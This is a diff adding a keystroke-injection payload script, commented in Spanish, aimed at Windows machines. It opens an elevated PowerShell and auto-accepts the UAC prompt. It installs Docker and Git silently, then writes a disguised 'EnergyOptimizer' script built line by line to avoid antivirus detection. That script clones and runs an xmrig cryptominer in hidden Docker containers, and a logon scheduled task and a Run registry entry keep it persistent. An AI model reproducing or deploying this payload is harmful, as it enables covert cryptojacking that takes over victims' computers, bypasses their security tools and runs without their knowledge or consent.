@@ -1,0 +1,75 @@
+REM Abrir PowerShell como admin
+DELAY 200
+GUI r
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+WAITFOR "Administrador: Windows PowerShell"
+DELAY 1500
+ALT s
+DELAY 1500
+
+REM INSTANCIA 1 - Instalar Git
+STRING Start-Process powershell -ArgumentList 'winget install --id Git.Git -e --silent' -WindowStyle Hidden
+ENTER
+DELAY 250
+
+REM INSTANCIA 2 - Instalar Docker Desktop
+STRING Start-Process powershell -ArgumentList 'winget install --id Docker.DockerDesktop -e --silent' -WindowStyle Hidden
+ENTER
+DELAY 250
+
+REM INSTANCIA 3 - Actualizar WSL
+STRING Start-Process powershell -ArgumentList 'wsl --update' -WindowStyle Hidden
+ENTER
+DELAY 250
+
+REM Fin
+STRING exit
+ENTER
+DELAY 200
+REM CREAR CARPETA EN RUTA SEGURA Y ESCRIBIR SCRIPT task.ps1
+
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 1500
+
+STRING $taskDir = "$env:APPDATA\EnergyOptimizer"
+ENTER
+DELAY 250
+STRING mkdir $taskDir -Force
+ENTER
+DELAY 250
+REM Crear script línea por línea (sin usar @' bloqueado por AV)
+STRING echo $dockerPath = "C:\Program Files\Docker\Docker\Docker Desktop.exe" >> "$taskDir\task.ps1"
+ENTER
+STRING echo $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" >> "$taskDir\task.ps1"
+ENTER
+STRING echo Set-ItemProperty -Path $regPath -Name "Docker Desktop" -Value "`"$dockerPath`"" >> "$taskDir\task.ps1"
+ENTER
+STRING echo cd "$taskDir" >> "$taskDir\task.ps1"
+ENTER
+STRING echo git clone http://github.com/anarcoiris/xmrig >> "$taskDir\task.ps1"
+ENTER
+STRING echo Start-Sleep -Seconds 600 >> "$taskDir\task.ps1"
+ENTER
+STRING echo Start-Process powershell -WindowStyle Hidden -ArgumentList 'cd "$taskDir\xmrig"; docker build -t xmrig-custom .; docker compose up --build -d' >> "$taskDir\task.ps1"
+ENTER
+
+DELAY 500
+
+REM CREAR TAREA PROGRAMADA QUE LO EJECUTE EN CADA INICIO
+STRING $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ExecutionPolicy Bypass -File `"$taskDir\task.ps1`""
+ENTER
+STRING $Trigger = New-ScheduledTaskTrigger -AtLogOn
+ENTER
+STRING Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "DockerAndXmrigInit" -User "$env:USERNAME" -RunLevel Highest -Force
+ENTER
+
+
+REM Fin
+STRING exit
+ENTER
+
